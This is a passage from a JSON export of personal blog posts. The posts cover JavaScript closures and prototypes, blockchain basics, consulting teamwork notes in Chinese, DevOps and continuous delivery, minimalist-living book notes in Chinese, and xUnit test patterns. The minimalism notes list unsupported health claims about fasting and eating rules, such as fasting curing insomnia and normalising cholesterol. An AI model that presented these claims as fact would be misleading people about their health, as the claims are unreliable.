is that in JavaScript a function reference also has a secret reference to the closure it was created in — similar to how delegates are a method pointer plus a secret reference to an object.\n1function say667() { 2\tvar num = 42; 3\tvar say = function() { console.log(num); } 4\tnum++; 5\treturn say; 6} 7var sayNumber = say667(); 8sayNumber(); //logs 43 1var gLogNumber, gIncreaseNumber, gSetNumber; 2function setupSomeGlobals() { 3\tvar num = 42; 4\tgLogNumber = function() { console.log(num); } 5\tgIncreaseNumber = function() { num++; } 6\tgSetNumber = function(x) { num = x; } 7} 8setupSomeGlobals(); 9gIncreaseNumber(); 10gLogNumber(); //43 11gSetNumber(5); 12gLogNumber(); // 5 13 14var oldLog = gLogNumber; 15 16setupSomeGlobals(); 17gLogNumber(); // 42 18oldLog() //5 Note that in the above example, if you call setupSomeGlobals() again, then a new closure (stack-frame!) is created.\nThe old gLogNumber, gIncreaseNumber, gSetNumber variables are overwritten with new functions that have the new closure.\nClosure can also introduce tricky bugs if not used correctly.\n1function buildList(list) { 2\tvar result = []; 3\tfor (var i = 0; i \u0026lt; list.length; i++) { 4\tvar item = \u0026#39;item\u0026#39; + i; 5\tresult.push(function() { console.log(item + \u0026#39; \u0026#39; + list[i]) }); 6\t} 7\treturn result; 8} 9function testList() { 10\tvar fnlist = buildList([1,2,3]); 11\tfor (var j = 0; j \u0026lt; fnlist.length; j++) { 12\tfnlist[j](); 13\t} 14} 15testList() // logs \u0026#39;item2 undefined\u0026#39; 3 times This is because just like previous examples, there is only one closure for the local variables for buildList. When the anonymous functions are called on the line fnlistj; they all use the same single closure, and they use the current value for i and item within that one closure (where i has a value of 3 because the loop had completed, and item has a value of 'item2'). Note we are indexing from 0 hence item has a value of item2. And the i++ will increment i to the value 3.\nSelf-executing function 1(function() { 2\tvar private_variable = \u0026#39;private\u0026#39;; 3})(); Scope Javascript has scope chain. When looking for the definition of a variable, the javascript engine first looks at the local execution context object. If the definition isn't there, it jumps up the scope chain to the execution context it was created in and looks for the variable definition in that execution context object, and so on until it finds the definition or reaches the global scope.\nGlobal scope. Objects at root are 'global'.\n1var a = \u0026#39;Hello\u0026#39; 2if(true) { 3\tvar b = a; 4} 5var c = b; //this works 1var a = \u0026#39;hello\u0026#39;; 2function() { 3\tvar b = a; 4} 5var c = b; //this doesn\u0026#39;t work Javascript lacks real namespaces. We can mimic by creating with objects to avoid polluting the global scope.\n1// Construct or Import Namespace 2var WilderMinds = WilderMinds || {}; 3WilderMinds.currentTime = function() { 4\treturn new Date(); 5}; Anonymous self-executing functions: protects the global namespace by function scope All Together: Namespaces and Anonymous Self-Executing Functions\n1(function(ns) { 2\tvar currentDate = new Date(); 3\tns.currentTime = function() { 4\treturn currentDate; 5\t}; 6})(window.WilderMinds = window.WilderMinds || {}); OOP in Javascript Javascript also support OOP paradiam.\nInheritance 1var proto = { 2\tsentence: 4, 3\tprobation: 2 4}; 5 6var Prisoner = function (name, id) { 7\tthis.name = name; 8\tthis.id = id; 9}; 10 11Prisoner.prototype = proto; 12var firstPrisoner = new Prisoner(\u0026#39;Joe\u0026#39;, \u0026#39;12A\u0026#39;); 13var secondPrisoner = new Prisoner(\u0026#39;Sam\u0026#39;, \u0026#39;2BC\u0026#39;); Object.Create can also do the same thing\nJavascript also has prototype chain. proto\nproto is the actual object that is used in the lookup chain to resolve methods, etc. prototype is the object that is used to build proto when you create an object with new().\n'Class' in Javascript Closures can make properties private\n1funciton Customer(name, company) { 2\t//public 3\tthis.name = name; 4\tthis.company = company; 5 6\t// private 7\tvar mailServer = \u0026#39;mail.google.com\u0026#39;; 8 9\tthis.sendEmail = function(email) { 10\tsendMailViaServer(mailServer); 11\t}; 12} Static Members 1function Customer(name, company) { 2\tthis.name = name; 3\tthis.company = company; 4} 5Customer.mailServer = \u0026#39;mail.google.com\u0026#39;; Sharing a function That way each instance doesn't have it's own copy\n1Customer.prototype.send = funciton(email) { … } Basic inheritance with the Prototype object\n1function Cow(color) { 2\tthis.color = color; 3} 4Cow.prototype = new Animal(\u0026#39;Hay\u0026#39;); 5 6var c = new Cow(\u0026#39;White\u0026#39;); 7c.feed(); 8var test = c instanceof Animal; // true 9var test2 = c instanceof Cow; // true Can Fake Abstract Classes with some caveats\n1var Animal = { 2\tfoodType: \u0026#39;None\u0026#39;, 3\tfeed: function() { 4\tlog(\u0026#39;fed the animal: \u0026#39; + this.foodType); 5\t} 6}; 7var a = new Animal(); //Fails (not a constructor) Object Reflection Property Syntaxes\nDot syntax: cust.name Bracket Syntax: cust[\u0026quot;name\u0026quot;] Enumerating members: simplest version of reflection\n1var cust = { 2\tname: \u0026#39;Shawn\u0026#39;, 3\t\u0026#39;company name\u0026#39;: \u0026#39;Wilder Minds\u0026#39;, 4\tsendMail: function() { … } 5}; 6for (var prop in cust) { 7\talert(prop); 8\talert(cust[prop]); 9} 10 11var has = cust.hasOwnProperty(\u0026#39;name\u0026#39;); 12var isEnum = cust.propertyIsEnumerable(\u0026#39;name\u0026#39;); Extension methods prototype can be used to add extension methods Add to existing type's prototype\n1Array.prototype.calculateCount = function() { 2\treturn this.length; 3}; 4var a = [\u0026#39;one\u0026#39;, \u0026#39;two\u0026#39;]; 5var count = a.calculateCount(); Written by Binwei@Trondheim\n","link":"http://localhost:1313/post/2017/introduction_to_javascript/","section":"post","tags":["web","frontend"],"title":"Introduction to Javascript"},{"body":"Blockchain Introduction Published: Sep 06, 2017 Tags: blockchain, security Category: ComputerScience\nBlockchain is the technology behind Bitcoin, this blog introduce what the Blockchain is.\nTable of Contents What is Blockchain Blockchain is a distributed ledger system which makes the transactions transparent and anonymous. By doing this, Blockchain brings a secure system.\nBased on cryptographic proof instead of trust, allowing any two willing parties to transact directly with each other without the need for a trusted third party\nThe Characteristics of Blockchain:\nGlobal Singleton Accessible Unstoppable Verifiable Major offerings\nBitcoin Ethereum IBM Bluemix How Blockchain works Key pair The users on the Blockchain have private/public key-pair. Private key must be kept as secret.\nWhen users send money from one account to another account, transaction will be created. Transaction using users' private key to generate signature. People uses public key to verify the transaction is not tampered.\nBesides the normal users, there is another role called miner.\nMiner Miners keeps track of the transactions\nReceive transactions Group transactions to form a new block Hash previous block + hash new block + random number Puzzle hash: Very compute intensive; Are rewarded for finding the number Miners work continuously The purpose of puzzle hash is to grantee the 'Proof of Work'. In order to get the reward, miners need to compete to resolve a random has puzzle which can only be handled by many tries without shortcut.\nThe blockchain is protected from modification because the hash-puzzle takes (on average) about a one-hundred-billion-billion attempts to find — it’s more work the any individual is capable of producing.\nWhen the transaction kicks, it is not verified at beginning which needs to be confirmed by the minders.\nBlock Transactions are stored in block. Each block contains the timestamp, the hash of previous block, the hash of itself, and nonce.\nThe bitcoin protocol demands that a block’s hash has to look a certain way; it must have a certain number of zeroes at the start (with a certain level of difficulty). There’s no way of telling what a hash is going to look like before you produce it, and as soon as you include a new piece of data in the mix, the hash will be totally different.\nMiners aren’t supposed to meddle with the transaction data in a block, but they must change the data they’re using to create a different hash. They do this using another, random piece of data called a ‘nonce’.\nThe blocks are stored in a structured: Merkle Tree.\nThe earlier block is, the safer. Because if one block is invalid, all the blocks after that will be invalid and needs to be recalculated again\nUsage of Blockchain Blockchain is expected to enable excluded people to enter the global economy, enable the protection of privacy and people to \u0026quot;monetize their own information\u0026quot;, and provide the capability to ensure creators are compensated for their intellectual property.\nPossible usages for Blockchain:\nDigital currencies Internet of things Product life cycle Certifications Secure information sharing Virtual products Blockchain 2.0 technologies go beyond transactions and enable \u0026quot;exchange of value without powerful intermediaries acting as arbiters of money and information\u0026quot;.\nResource Crypto currency overview: www.coinmarketcap.com\nYou can see all the transactions from: www.blockchain.info\nDevelopment resource:\nBitCore: http://bitcore.io https://bitcoin.org/en/developer-documentation https://github.com/bitcoin/bitcoin Written by Binwei@Oslo\n","link":"http://localhost:1313/post/2017/blockchain_introduction/","section":"post","tags":["blockchain","security"],"title":"Blockchain Introduction"},{"body":"The Mckinsey Engagement Published: Sep 03, 2017 Tags: booknotes Category: Management\nThe book notes of .\nTable of Contents 开会与交流 所有会议都应该有一个明确的议程（或列出一张供讨论的问题清单），并做出具体的决定和新的行动方案。 通过频繁的电子邮件交流使团队成员了解项目的最新进程，不过格式要简单统一。请记住，过度交流肯定会好于交流不足\n观点遭到小组的反对，我们可能会变得冲动并进行激烈的争辩以使他人接受自己的观点。不过，最好的办法是说出自己的观点，把问题本身和提出问题的人相分离，然后从正反两面对观点展开讨论，重点关注积极的方面。\n在评估问题和意见的正反两面时，一定要把人与他所提出的见解分开。在评价问题时，应就事论事，要摒弃针对人的个人成见 在项目实施前，举行一个简短轻松的会议，交流一下各自的个性和工作方法偏好。在项目实施过程中，保持这样的交流 了解自己的本性，同时在与不同性格类型的成员相处时保持良好的心态\n团队合作 信任，但要确认 --罗纳德 里根 常引用的俄罗斯谚语\n作为附加策略，竞争理念的融合也有助于所有团队的互动。\n5P原则：\n认真准备 (prepare): 观察身边之人的积极行为并了解他们的背景 他人为重(put others first): 这是生活中需遵循的普通法则 真诚赞美 (praise sincerely): 与他人分享你的发现，但切忌过分与虚伪 勿施压于人 (puressure no one): 互动时，避免谈及令人尴尬的话题和靠得太近 提供帮助 (provide value): 为了强化你的成果，还要设法长期提供帮助 （我最喜欢的方式就是给他们寄一些他们感兴趣的读物） 时间紧迫往往会使人更加兴奋地工作，压力就是最大的动力\nTeam Focus模型\n+---------------------------------------+-------------------------------+ | Team | Focus | +---------------------------------------+-------------------------------+ | 交流 (Talk) | 界定 （Frame） | | | | | * 沟通不息 | * 明确关键问题 | | * 用心倾听 | * 创建议题树 | | * 人事分离 | * 形成基本假设 | +---------------------------------------+-------------------------------+ | 评价 (Evaluate) | 组织 (Organize) | | | | | * 讨论团队协作状态 | * 构建总体流程图 | | * 确定期望与监控完成情况 | * 制定内容计划以检验假设 | | * 明确个人发展目标并相应调整工作计划 | * 设计故事线索 | +---------------------------------------+-------------------------------+ | 协助 (Assist) | 收集 (Collect) | | | | | * 充分利用专长 | * 通过“草图”呈现必要数据 | | * 各司其职 | * 进行针对性的访问 | | * 实时反馈 | * 收集第三方数据、资料 | +---------------------------------------+-------------------------------+ | 激励 (Motivate) | 解读 (Understand) | | | | | * 确定个性化激励因素 | * 明确 “so what\u0026quot; (为什么) | | * 积极正面影响团队成员 | * 理清对项目相关方面的启示 | | * 庆祝成就 | * 记录所有图表中的核心见解 | +---------------------------------------+-------------------------------+ | | 提炼 (Synthesize) | | | | | | * 获取意见，确保认可 | | | * 提供具体的改进意见 | | | * 讲述一个好故事 | +---------------------------------------+-------------------------------+\n赞美 赢得朋友并能影响他人的秘诀在于关注对方并时刻给予他们真诚的赞美 -- 戴尔 卡内基\n如果过头了，人们就不再相信你的赞美是真诚的。确保真诚性的办法就是将反馈重点放在你切实观察到的内容，尤其是那些在实现队员自身发展目标时所取得的进步\n项目汇报 从项目开始实施的第一天起，就应开始准备最终汇报\n一天绘制一张图表：强调用图表形式记录你的观察和想法的重要性。实际上你每天可能需要绘制很多这样的草图\n使用金字塔原理\nWritten by Binwei@Oslo\n","link":"http://localhost:1313/post/2017/the_mckinsey_engagement/","section":"post","tags":["booknotes"],"title":"The Mckinsey Engagement"},{"body":"","link":"http://localhost:1313/tags/continuousdelivery/","section":"tags","tags":null,"title":"Continuousdelivery"},{"body":"","link":"http://localhost:1313/tags/devops/","section":"tags","tags":null,"title":"Devops"},{"body":"DevOps and Continuous Delivery Published: Sep 01, 2017 Tags: booknotes, process, devops, continuousdelivery Category: ComputerScience\nDevOps and continuous delivery are two hot topics these days, which play more and more important role in software development especially for the SaaS (Software as a Service) solution.\nTable of Contents DevOps DevOps is a software development and delivery process that emphasizes communication and collaboration between product management, software development, and operations professionals. It supports this by automating and monitoring the process of software integration, testing, deployment, and infrastructure changes by establishing a culture and environment where building, testing, and releasing software can happen rapidly, frequently, and more reliably.\nDevelopment teams are incentivized to deliver software as rapidly as possible, whereas operations teams aim for stability. DevOps strives to bring these two into one team.\nThe key of DevOps is to Add value and Improve flow.\nRelationship with Lean Lean has the following principles:\nFocus on customer value Eliminate waste Reduce cycle time Shared learning Avoid batching Theory of constraints DevOps emphasize on the followings:\nCulture Automation Monitoring Sharing DevOps is the result of implementing Lean principles to IT value stream. -- Gene Kim\nDevOps encourage culture changes, and emphasize the followings:\nEmpowerment Accountability Teamwork Reorgnization Organizations which design systems... are constrained to produce designs which are copies of the communication structures of these organizations. -- Conway's law\nSpecialist encourage silos. Reorg the team as 'Service team'. Project is too dynamic.\nSpotify model is very interesting.\nTools Use the right tool is important for DevOps, for DevOps there are tools to cover the whole life cycle.\nCollaboration: wiki in Github, Blog Planning: Trello Issue tracking: ZENDESK Configuration management: treat infrastructure as code, Chef, Salt, Puppet, Ansible, Powershell DSC Source control: Github Dev environment: CodeNVY, Vagrant Continuous integration: Jenkins, Travis CI, Continuous deployment: Cloudformation (Amazon), Packer, Docker, Octopus, Go (thoughtworks), Octopus deploy Application Logging \u0026amp; Metrics\nELMAH (Error Logging Modules and Handlers), NLog, Log4Net Serilog + Seq ELK - Elastic Search, LogStash, Kibana Application Insights RayGun.io HockeyApp (for mobile) Stackify NewRelic Operation:\nMicrosoft system center Splunk Process Metrics\nSprint Velocity Time spent by testers Time spent deploying Time spent getting a new developer up to speed Code Metrics\nCode Analysis SSW Code Auditor SonarQube https://xebialabs.com/periodic-table-of-devops-tools/\nOthers practices You can't take your Puppet scripts and push them to a Chef agent, nor can you do the reverse. Puppet/Chef/etc are fully integrated stacks - and they're proprietary stacks\nMicrosoft isn't pushing DSC as a fully integrated stack. DSC is just the bottom layer that accepts a configuration and implements it. Puppet Labs could absolutely design their product to turn Puppet scripts into the MOF file that DSC needs.\nContinuous Delivery We want to deliver software often and deliver value to customers quicker. Continuous Delivery is important.\nAnti patterns\nDeploying software manually Deploying to a production-like-environment only after development is complete (staging) Manual configuration management of production environment The principles, practices, and techniques are aimed at making release boring.\nDeployment pipeline The deployment pipeline:\nCommit Stage: Compile, Unit test, Analysis, Build installer Automated acceptance testing Automated capacity testing Manual testing: Showcases, Exploratory testing Release Ideally, a commit stage should take less than five minutes to run, and certainly no more than ten\nThe aim of the deployment pipeline is threefold:\nIt makes every part of the process of building, deploying, testing and releasing software visible to everybody involved, aiding collaboration It improves feedback so that problems are identified and so resolved, as early in the process as possible It enables teams to deploy and release any version of their software to any environment at will through a fully automated process Any stages that deploy the binaries to a production-like environment for manual testing or release purposes should require you to press a button in order to select the version to deploy, and this capability will usually require authorization.\nThe deployment pipeline implementation you create should record every time a process starts and finishes, and what the exact changes were that went through each stage of your process.\nWe need to automate the deployment pipeline gradually over time.\nIf it hurts, do it more frequently, and bring the pain forward. More frequent releases lead to lower risk in putting out any particular release\nCreate a script for each stage in your deployment pipeline\nManage changes A working software can be decomposed into four categories: executable code, configuration, host environment, and data. If any of them changes, the behavior changes. Therefore we need to keep all these four of these components under control and ensure that a change in any one of them is verified.\nConfiguration management of every application should be planned as part of project inception.\nAutomate test suite Automated Test Suite\nTwo stages:\nCompile the software, run your suite of unit tests, create deployable binary (Commit stage) Take the binaries from first stage and run acceptance tests, integration tests, performance tests concurrently Make sure that the automated tests, including smoke tests can be run on developer machines.\nTest automation pyramid - Mike Cohn\nAcceptance testing The goal of the acceptance test stage is to assert that the system delivers the value the customer is expecting and that it meets the acceptance criteria. The reality is that the whole team owns the acceptance tests Acceptance tests should be expressed in the language of the business, not in the language of the technology of the application.\nAcceptance criteria: Given, When, Then\nTest implementation layer: code uses domain language; no reference to UI elements\nApplication driver layer: understands how to interact with the application to perform actions and return results\nThe objective of acceptance testing is to prove that our application does what the customer meant it to, not that it works the way its programmers think it should.\nAn application written with testability in mind will have an API that both the GUI and the test harness can talk to in order to drive the application.\nNon-functional requirement While in an ideal world everyone wants their systems to be highly secure, very high performance, massively flexible, extremely scalable, easy to use, easy to support, and simple to develop and maintain, in reality every one of these characteristics comes at a cost.\nEvery architecture involves some trade-off between nonfunctional requirements - hence the Software Engineering Institute's Architecture Tradeoff Analysis Model (ATAM) designed to help teams decide upon a suitable architecture by a thorough analysis of its NFR (nonfunctional requirement, referred to as 'quality attributes')\nHere are some types of measurements that can be performed:\nScalability testing. How do the response time of an individual request and the number of possible simultaneous users change as we add more servers, services, or threads? Longevity testing. This involves running the system for a long time to see if the performance changes over a protracted period of operation. This type of testing can catch memory leaks or stability problems Throughput testing. How many transactions, or messages, or page hits per second can the system handle? Load testing. What happens to capacity when the load on the application increases to production-like proportions and beyond? This is perhaps the most common class of capacity testing. Capacity testing. Is one of the few situations where virtualisation is not appropriate (unless your production environment is virtual) because of the performance overhead it introduces Distributed version control system The core characteristic of a distributed version control system (DVCSs) is that every repository contains the entire history of the project, which means that no repository is privileged except by convention.\nIn the GitHub model, contributors are made by first forking the repository of the project you wish to contribute to, making your changes, and then asking the owners of the original repository to pull your changes.\nA particular release of the software could come from any of the forks, provided it passed all the tests and was accepted by the project leaders.\nDVCSs can be extremely effective as part of a traditional continuous integration system, in which there is designated central repository to which everybody regularly pushes their changes.\nBrach by feature This pattern is designed to make it easier for large teams to work simultaneously on features while keeping mainline in a releasable state. Every story or feature is developed on a separate branch. Only after a story is accepted by testers, it is merged to mainline so as to ensure that mainline is always releasable.\nPrerequisites:\nAny changes from mainline must be merged onto every branch on a daily basis Branches must be short-lived, ideally less than a few days, never more than an iteration The number of active branches that exist at any time must be limited to the number of stories in play. Nobody should start a new branch unless the branch representing their previous story is merged back to mainline. Consider having testers accept stories before they are merged. Only allow developers to merge to trunk once a story has been accepted Refactorings must be merged immediately to minimize merge conflicts. This constraint is important but can be painful, and further limits the utility of this pattern Part of the technical lead's role is to be responsible for keeping the trunk releasable. The tech lead should review all merges, perhaps in patch form. The tech lead has the right to reject patches that may potentially break the trunk. Give developers ownership At some organizations, there are teams of specialists who are experts at the creation of effective, modular build pipelines and the management of the environments in which they run.\nRun-of-the-mill changes, such as adding new libraries, configuration files, and so on, should be performed by developers and operations people working together as they find the need to do so.\nThis kind of activity should not be done by a build specialist, except perhaps in the very early days of a project when the team is working to establish the build. We consider it a failure if we got to the point where only those specialists can maintain the CI system.\nThe expertise of specialists is not to be undervalued, but their goal should be to establish good structures, patterns, and use of technology, and to transfer their knowledge to the delivery team. Once these ground rules are established, their specialist expertise should only be needed for significant structural shifts, not regular day-to-day build maintenance.\nRoll back It is essential to be able to roll back a deployment in case it goes wrong.\nTwo important constraints:\nData, if your release process makes changes to your data, it can be hard to roll back. The other systems you integrate with. With releases involving more than one system (known as orchestrated releases), the rollback process becomes more complex too. Rolling back by redeploying the previous good version\nTransitional deployment is important if something goes wrong and want to 'roll back'.\nRelease experience Release a new version of software installed by users on their own machines:\nManaging and upgrade experience Migrating binaries, data, and configuration Testing the upgrade process Getting crash report from users 3 approaches:\nLet software check update and prompt the users to download and upgrade to the new version Download in the background and prompt for installation Download in the background and silently upgrade the next time the application is restarted So in fact, giving users a choice simply tells them that the developers have no confidence in the upgrade process. Don't delete the old files, move them\nEssential practices The essential practices include:\nDon't check in on a broken build Always run all commit tests locally before committing, or get your CI server to do it for you: Pretested commit, personal build, or preflight build (supported by modern CI) Wait for commit tests to pass before moving on Never go home on a broken build Always be prepared to revert to the previous revision Time-box fixing before reverting Don't comment out failing tests Take responsibility for all breakages that result from your changes Deploying user stories\nStories are the unit of work for building the product Stories should be tested as soon as they are finished Stories can be deployed as soon as they are tested Stories may be deployed in batch in order to reduce overhead CI/CD:\nOnly build your binaries once Automate deployment (easy rollback) Deploy the same way to every environment Smoke test your deployments Deploy into a copy of production If any part of the pipeline fails, stop the line Other practices What we end up with is (in lean parlance) a pull system:\nBook: Lean software development: An Agile Toolkit Implementing Lean Software Development: From Concept to Cash Visualize the release status through Release dashboard\nZero-downtime releases\nCanary release:\nRolling back easily A/B testing Check capacity requirements gradually Written by Binwei@Oslo\n","link":"http://localhost:1313/post/2017/devops_and_continuous_delivery/","section":"post","tags":["booknotes","process","devops","continuousdelivery"],"title":"DevOps and Continuous Delivery"},{"body":"The Art of Simplicity Published: Aug 31, 2017 Tags: booknotes Category: Life\nThe original version was written in French named \u0026lt;L'art de la simplicite\u0026gt; by Dominique Loreau. This book show the tips regarding to have a simplified but high quality life.\nTable of Contents 简单 简单，就是拥有极少，把空间留给必需和精华。 简单，让生活摆脱使人精力分散、紧张不安的偏见、拘束和压力，为我们提供很多问题的解决方法。\n不要再拥有过多的到东西，你将省出更多时间来关注自己的身体。 当对自己的身体感觉良好时，就能忘记肉体的存在，专注于精神发展，达到充满意义的生命状态。你将感到更加幸福。\n只保留你喜欢的东西，其他的都没有意义。 别让俗气和过时的东西侵占你的空间。\n拥有极少，但都要最好的。 别满足于一只不错的沙发，而要买最漂亮，最轻柔，最符合“人体工学”，最舒适的沙发。\n毫不迟疑地甩掉“差不多”，代之以完美的东西。 哪怕这样做会让很多人认为你大手大脚。 极简主义可不便宜，但付出这样的代价，你能达到自足于严格的极简。\n作出错误的决定，才能发现最适合我们的。 错误是我们的老师。\n时不时“变换速度”，可以让你不至于在庸常事物中越陷越深，以更大的热情投入每一刻\n记录你所有收入和支出。这有助于你采取更多节约措施，更好地管理你的财务状况，让你的生活简单化。\n去除平庸 绝不接受你不想要的东西\n丢弃东西或者把东西送人时，不要有负罪感。\n不要在浴室里收集一堆化妆品小样\n设想你的房子毁于火灾，把你要重新买的东西列出来。 然后把不打算买的东西也列出来。 给你喜爱但从不使用的东西拍照留念，然后把它们清理一空。\n体验一下你的需要，如有迟疑，就放弃这种需要\n把今年一次也没用到的东西清理掉\n牢记如下符咒：“除了必不可少的，我一无所需。”\n要领会“少就是多”的道理\n把需要和欲望区分清楚\n试试你能“坚持”多久不用一件你本以为不可缺少的东西。\n尽可能减少身外之物\n不要认为“整理”就是把东西重新摆放。\n秘方越古老越有效，因为无效的早被人忘掉了\n关于吃 禁食的目的在于。。。。\n减肥（禁食无疑是见效最快的方法） 改善身心状态 透透空气，让自己感觉更加年轻 让身体器官休养生息 清洁身体器官 提高消化能力 改善面色 让自己更加美丽动人 改善口气 活跃脑细胞 改善饮食习惯 增强自制力 延缓衰老 让胆固醇水平正常化 治疗失眠和心理压力 让生活更加充实 教给身体只需消耗必需之物的道理 饥饿的程度\n绝对饥饿（要避免这种情况，因为到了这个程度你会扑向任何东西） 过于饥饿，令你不择饮食 严重饥饿，你应该立即进食 适度饥饿，还可以再坚持一下 轻度饥饿，并不是真正饥饿 饱足，进食后的放松状态 略有不适，有很浓的睡意 非常不适，胃部不舒服胀痛 时间安排\n不感到饥饿时吃东西都会令我发胖（身体无法消化这些食物） 只有饥饿时，进食才能成为一种愉悦 为促进新陈代谢，每日6顿小食强于每日2顿大餐。 饥饿感并非每天都有 每次就餐前，我都得问一问身体需要什么 餐后必须活动20分钟 禁食应该做好计划，不能与跳过一顿饭混为一谈 睡眠之前3个小时内不能进食，胃应该停止消化 结束进餐后15分钟才能喝水。身体每次只需要一种食物 “为了过会不饿”而进食会令人发胖 禁食是一种修身的艺术 除非是真正的饥饿，没什么“饿得发慌”的情况是不能忍受的 心情郁闷时，我不需要吃巧克力，而是需要振奋一下 首先吃最喜欢的食物，这样可以更快心满意足 营养学\n糖，盐和酒精会造成大腿臃肿，脸部虚胖，身体组织充血 糙米，番薯和土豆是补充能量的最好食物 富含蛋白质的最好食品是豆腐，鱼类，核桃，榛子，杏仁等 盐，白面粉，糖和化学食品会促进橙皮纹出现 纯热量食物会减少我的能量，阻碍新陈代谢 食用肉类，鱼类和蔬菜等，尽量保持其天然性质 饥饿时，食用慢糖食物，例如，一片稍微抹了些蜜的面包 如果食用新鲜食品，就不必额外补充维生素 糖越吃越爱吃，吃盐越多口味越重，喝酒越多越上瘾 酒中富含糖类，糖可以转化为脂肪 食用没有生命力的食物让身体没有生命力 蔬菜中已经含有盐了 用两三个月的时间足以忘记盐或糖的味道 Written by Binwei@Oslo\n","link":"http://localhost:1313/post/2017/the_art_of_simplicity/","section":"post","tags":["booknotes"],"title":"The Art of Simplicity"},{"body":"Xunit Test Patterns Published: Aug 27, 2017 Tags: booknotes, architecture Category: ComputerScience\nXunit Test Pattern is a fantastic book which shares the experience and good practice to write tests.\nTable of Contents Test Introduction Easy to run tests What makes tests easy to run? Four specific goals answer this question:\nThey must be Fully Automated Tests so they can be run without any effort. They must be Self-Checking Tests so they can detect and report any errors without manual inspection. They must be Repeatable Tests so they can be run multiple times with the same result. Ideally, each test should be an Independent Test that can be run by itself. Our tests should be small and test one thing at a time.\nThe major exception to the mandate to keep Test Methods short occurs with customer tests that express real usage scenarios of the application. Such extended tests offer a useful way to document how a potential user of the software would go about using it; if these interactions involve long sequences of steps, the Test Methods should reflect this reality.\nPurpose of Tests Customer tests\nVerify the behavior of the entire system or application.\nThey typically correspond to scenarios of one or more use cases, features, or user stories. These tests often go by other names such as functional tests, acceptance tests, or end-user tests. Although they may be automated by developers, their key characteristic is that an end user should be able to recognize the behavior specified by the test even if the user cannot read the test representation.\nUnit tests\nVerify the behavior of a single class or method that is a consequence of a design decision.\nThis behavior is typically not directly related to the requirements except when a key chunk of business logic is encapsulated within the class or method in question. These tests are written by developers for their own use; they help developers describe what “done looks like” by summarizing the behavior of the unit in the form of tests.\nComponent tests\nVerify components consisting of groups of classes that collectively provide some service.\nThey fit somewhere between unit tests and customer tests in terms of the size of the SUT (System under test) being verified. Although some people call these “integration tests” or “subsystem tests,” those terms can mean something entirely different from “tests of a specific larger-grained subcomponent of the overall system.”\nFault insertion tests\nTypically show up at all three levels of granularity within these functional tests, with different kinds of faults being inserted at each level.\nFrom a test automation strategy point of view, fault insertion is just another set of tests at the unit and component test levels. Things get more interesting at the whole-application level, however. Inserting faults here can be hard to automate because it is challenging to automate insertion of the faults without replacing parts of the application.\nProperty Tests\nPerformance tests verify various “nonfunctional” (also known as “extra-functional” or “cross-functional”) requirements of the system.\nThese requirements are different in that they span the various kinds of functionality. They often correspond to the architectural “-ilities.” These kinds of tests include\nResponse time tests Capacity tests Stress tests From a test automation perspective, many of these tests must be automated (at least partially) because human testers would have a hard time creating enough load to verify the behavior under stress. While we can run the same test many times in a row in xUnit, the xUnit framework is not particularly well suited to automating performance tests.\nUsability Tests\nUsability tests verify “fitness for purpose” by confirming that real users can use the software application to achieve the stated goals.\nThese tests are very difficult to automate because they require subjective assessment by people regarding how easy it is to use the SUT. For this reason, usability tests are rarely automated and will not be discussed further in this book.\nExploratory Testing\nExploratory testing is a way to determine whether the product is self-consistent.\nThe testers use the product, observe how it behaves, form hypotheses, design tests to verify those hypotheses, and exercise the product with them. By its very nature, exploratory testing cannot be automated, although automated tests can be used to set up the SUT in preparation for doing exploratory testing.\nTests and Continuous Integration By organizing the unit tests and customer tests into separate test suites, we ensure that we can run just the unit tests or just the customer tests if necessary.\nThe unit tests should always pass before we check them in. To ensure that the unit tests are run frequently, we can include them in the Smoke Tests that are run as part of the Integration Build. Although many of the customer tests will fail until the corresponding functionality is built, it is nevertheless useful to run all the passing customer tests as part of the integration build phase—but only if this step does not slow the build down too much. In that case, we can leave them out of the check-in build and simply run them every night. System level tests cannot be thorough\nTDD unit tests can be thorough\nWay of capturing tests Anti-Patterns Obscure Test It is difficult to understand the test at a glance.\nAutomated tests should serve at least two purposes.\nFirst, they should act as documentation of how the SUT should behave; we call this Tests as Documentation. Second, they should be a self-verifying executable specification. Cause: Mystery Guest\nThe test reader is not able to see the cause and effect between fixture and verification logic because part of it is done outside the Test Method.\nCause: General Fixture\nThe test builds or references a larger fixture than is needed to verify the functionality in question.\nCause: Irrelevant Information\nThe test exposes a lot of irrelevant details about the fixture that distract the test reader from what really affects the behavior of the SUT.\nCause: Hard-Coded Test Data\nData values in the fixture, assertions, or arguments of the SUT are hard-coded in the Test Method, obscuring cause–effect relationships between inputs and expected outputs.\nCause: Indirect Testing\nThe Test Method interacts with the SUT indirectly via another object, thereby making the interactions more complex.\nConditional Test Logic A test contains code that may or may not be executed.\nIn general, the tests should try to:\nEliminating “if” Statements Eliminating Loops Cause: Flexible Test\nThe test code verifies different functionality depending on when or where it is run.\nCause: Conditional Verification Logic\nConditional Test Logic may also create problems when it is used to verify the expected outcome. This issue usually arises when the tester tries to prevent the execution of assertions if the SUT fails to return the right objects or uses loops to verify the contents of collections returned by the SUT.\nCause: Production Logic in Test\nSymptoms: Some forms of Conditional Test Logic are found in the result verification section of our tests.\nCause: Complex Teardown\nSymptoms: Complex fixture teardown code is more likely to leave the test environment corrupted if it does not clean up after itself correctly.\nIt is hard to verify that teardown code has been written correctly, and such code can easily result in “data leaks” that may later cause this or other tests to fail for no apparent reason.\nCause: Multiple Test Conditions\nSymptoms: A test tries to apply the same test logic to many sets of input values, each with its own corresponding expected result.\nHard-to-Test Code Code is difficult to test.\nCause: Highly Coupled Code\nSymptoms: A class cannot be tested without also testing several other classes.\nCause: Asynchronous Code\nSymptoms: A class cannot be tested via direct method calls.\nThe test must start an executable (such as a thread, process, or application) and wait until its start-up has finished before interacting with the executable.\nCause: Untestable Test Code\nSymptoms: The body of a Test Method is obscure enough (Obscure Test) or contains enough Conditional Test Logic that we wonder whether the test is correct.\nTest Code Duplication The same test code is repeated many times.\nCause: Cut-and-Paste Code Reuse\nCause: Reinventing the Wheel\nWhile Cut-and-Paste Code Reuse deliberately makes copies of existing code to reduce the effort of writing tests, it is also possible to accidentally write the same sequence of statements in different tests.\nTest Logic in Production The code that is put into production contains logic that should be exercised only during tests.\nThe SUT may contain logic that cannot be run in a test environment. Tests may require the SUT to behave in specific ways to allow full test coverage.\nCause: Test Hook\nConditional logic within the SUT determines whether the “real” code or test specific logic is run.\nCause: For Tests Only\nCode exists in the SUT strictly for use by tests.\nCause: Test Dependency in Production\nProduction executables depend on test executables.\nCause: Equality Pollution\nAnother cause of Test Logic in Production is the implementation of test-specific equality in the equals method of the SUT.\nAssertion Roulette It is hard to 